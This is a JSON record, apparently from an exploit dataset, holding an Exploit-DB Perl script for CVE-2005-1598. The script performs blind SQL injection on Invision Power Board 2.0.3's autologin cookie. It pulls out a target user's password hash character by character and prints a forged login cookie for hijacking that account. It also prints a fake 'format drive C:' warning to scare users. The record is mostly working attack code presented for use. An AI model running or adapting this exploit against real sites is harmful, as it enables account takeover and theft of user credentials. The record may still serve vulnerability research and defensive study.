{
  "id": "1013",
  "title": "Invision Power Board 2.0.3 - &#039;login.php&#039; SQL Injection",
  "cve": "CVE-2005-1598",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl -w\r\n##################################################################\r\n# This one actually works :) Just paste the outputted cookie into\r\n# your request header using livehttpheaders or something and you\r\n# will probably be logged in as that user. No need to decrypt it!\r\n# Exploit coded by \"Tony Little Lately\" and \"Petey Beege\"\r\n##################################################################\r\n\r\nuse LWP::UserAgent;\r\n\r\n   $ua = new LWP::UserAgent;\r\n   $ua->agent(\"Mosiac 1.0\" . $ua->agent);\r\n\r\nif (!$ARGV[0]) {$ARGV[0] = '';}\r\nif (!$ARGV[3]) {$ARGV[3] = '';}\r\n\r\nmy $path = $ARGV[0] . '/index.php?act=Login&CODE=autologin';\r\nmy $user = $ARGV[1];   # userid to jack\r\nmy $iver = $ARGV[2];   # version 1 or 2\r\nmy $cpre = $ARGV[3];   # cookie prefix\r\nmy $dbug = $ARGV[4];   # debug?\r\n\r\nif (!$ARGV[2])\r\n{\r\n        print \"The type of the file system is NTFS.\\n\\n\";\r\n        print \"WARNING, ALL DATA ON NON-REMOVABLE DISK\\n\";\r\n        print \"DRIVE C: WILL BE LOST!\\n\";\r\n        print \"Proceed with Format (Y/N)?\\n\";\r\n        exit;\r\n}\r\n\r\nmy @charset = (\"0\",\"1\",\"2\",\"3\",\"4\",\"5\",\"6\",\"7\",\"8\",\"9\",\"a\",\"b\",\"c\",\"d\",\"e\",\"f\");\r\n\r\nmy $outputs = '';\r\n\r\nfor( $i=1; $i < 33; $i++ )\r\n{\r\n        for( $j=0; $j < 16; $j++ )\r\n        {\r\n                my $current = $charset[$j];\r\n            my $sql = ( $iver < 2 ) ?  \"99%2527+OR+(id%3d$user+AND+MID(password,$i,1)%3d%2527$current%2527)/*\" :\r\n\"99%2527+OR+(id%3d$user+AND+MID(member_login_key,$i,1)%3d%2527$current%2527)/*\";\r\n                my @cookie = ('Cookie' => $cpre . \"member_id=31337420; \" . $cpre . \"pass_hash=\" . $sql);\r\n                my $res = $ua->get($path, @cookie);\r\n\r\n                # If we get a valid sql request then this\r\n                # does not appear anywhere in the sources\r\n                $pattern = '<title>(.*)Log In(.*)</title>';\r\n\r\n                $_ = $res->content;\r\n\r\n                if ($dbug) { print };\r\n\r\n                if ( !(/$pattern/) )\r\n                {\r\n                        $outputs .= $current;\r\n                        print \"$current\\n\";\r\n                    last;\r\n                }\r\n\r\n        }\r\n  if ( length($outputs) < 1 )   { print \"Not Exploitable!\\n\"; exit;     }\r\n}\r\nprint \"Cookie: \" . $cpre . \"member_id=\" . $user . \";\" . $cpre . \"pass_hash=\" . $outputs;\r\nexit;\r\n\r\n# milw0rm.com [2005-05-26]",
  "url": "https://www.exploit-db.com/exploits/1013"
}